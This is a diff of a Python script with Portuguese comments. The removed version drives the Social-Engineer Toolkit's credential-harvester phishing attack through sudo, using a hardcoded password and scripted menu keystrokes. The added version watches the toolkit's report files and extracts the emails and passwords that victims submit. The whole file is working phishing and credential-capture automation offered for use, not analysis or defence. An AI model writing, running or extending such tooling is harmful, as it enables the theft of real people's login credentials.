@@ -1,72 +1,72 @@
-import subprocess
+import os
+import glob
 import time
 
-# CONFIGURAÇÕES
-senha = "123"
-comando_app = "setoolkit"
 
-# Monta o comando com sudo -S (Lê senha do stdin)
-# O '-p' '' serve para remover o prompt "Password:" da saída, limpando o log
-comando_completo = ["sudo", "-S", "-p", "", comando_app]
+email = ''
+password = ''
 
-try:
-    print(f"--- Iniciando {comando_app} com SUDO ---")
+def encontrar_arquivo_mais_recente(diretorio):
+    # Lista todos os arquivos no diretório (inclusive dentro de subpastas se necessário)
+    # O SET costuma criar uma pasta XML ou HTML. Vamos focar em achar o arquivo XML ou texto modificado.
+    # Para simplificar, vamos buscar qualquer arquivo na estrutura de reports.
+    list_of_files = glob.glob(diretorio + "/*", recursive=True)
 
-    processo = subprocess.Popen(
-        comando_completo,
-        stdin=subprocess.PIPE,  # Habilita escrita (para senha e menu)
-        stdout=subprocess.PIPE,  # Habilita leitura
-        stderr=subprocess.STDOUT,  # Erros e logs juntos
-        text=True,
-        bufsize=1  # Buffer linha a linha
-    )
+    if not list_of_files:
+        return None
 
-    # --- FASE 1: Passar pelo SUDO ---
-    # O sudo -S espera a senha imediatamente
-    processo.stdin.write(f"{senha}\n")
-    processo.stdin.flush()
+    # Retorna o arquivo com a data de criação mais recente
+    latest_file = max(list_of_files, key=os.path.getctime)
+    return latest_file
 
-    # Dê um pequeno respiro para o programa carregar o menu após o sudo liberar
-    time.sleep(1)
 
-    # --- FASE 2: Passar pelo Menu Interativo ---
-    # Agora o seu programa está rodando e esperando a opção
-    print(f"Ativando credencial harvester")
-    processo.stdin.write(f"1\n")
-    processo.stdin.flush()
+def monitorar_arquivo(caminho_arquivo):
+    global email, password
 
-    time.sleep(1)
-    processo.stdin.write(f"2\n")
-    processo.stdin.flush()
+    print(f"[*] Monitorando o arquivo: {caminho_arquivo}")
 
-    time.sleep(1)
-    processo.stdin.write(f"3\n")
-    processo.stdin.flush()
+    try:
+        with open(caminho_arquivo, 'r', errors='ignore') as f:
+            f.seek(0, 2)  # Vai para o final
 
-    time.sleep(1)
-    processo.stdin.write(f"1\n")
-    processo.stdin.flush()
+            while True:
+                line = f.readline()
+                if not line:
+                    time.sleep(0.1)
+                    continue
 
-    time.sleep(1)
-    processo.stdin.write(f"\n")
-    processo.stdin.flush()
+                line = line.strip()  # Remove espaços e quebras de linha extras
 
-    time.sleep(1)
-    processo.stdin.write(f"2\n")
-    processo.stdin.flush()
+                # --- Lógica de Captura ---
+                if "Email=" in line:
+                    # Tenta quebrar a linha no sinal de igual
+                    partes = line.split("=")
+                    if len(partes) > 1:
+                        email = partes[1]  # Pega o que vem depois do =
+                        print(f"[+] Email guardado na variavel global: {email}")
 
-    print("--- Monitoramento Iniciado ---")
-    print("-" * 30)
+                if "passwd=" in line or "Passwd=" in line:
+                    partes = line.split("=")
+                    if len(partes) > 1:
+                        password = partes[1]
+                        print(f"[+] Senha guardada na variavel global: {password}")
 
-    # --- FASE 3: Leitura dos Logs ---
-    for linha in processo.stdout:
-        linha = linha.strip()
-        print(f"[LOG]: {linha}")
+    except KeyboardInterrupt:
+        print("\nParando...")
 
-except PermissionError:
-    print("Erro: O Python não teve permissão para executar o arquivo.")
-except KeyboardInterrupt:
-    print("\nParando...")
-    processo.terminate()
-except Exception as e:
-    print(f"Erro inesperado: {e}")
+
+def main():
+    arquivo_recente = encontrar_arquivo_mais_recente('/root/.set/reports')
+
+    # Se não achar na pasta padrão, tenta achar no diretório atual (caso tenha salvo log manual)
+    if not arquivo_recente:
+        print("[-] Nenhum relatório encontrado em /root/.set/reports.")
+        # Tenta buscar um arquivo txt local se você usou o 'tee' do exemplo anterior
+        exit()
+    monitorar_arquivo(arquivo_recente)
+    print(email)
+    print(password)
+
+
+if __name__ == "__main__":
+    main()
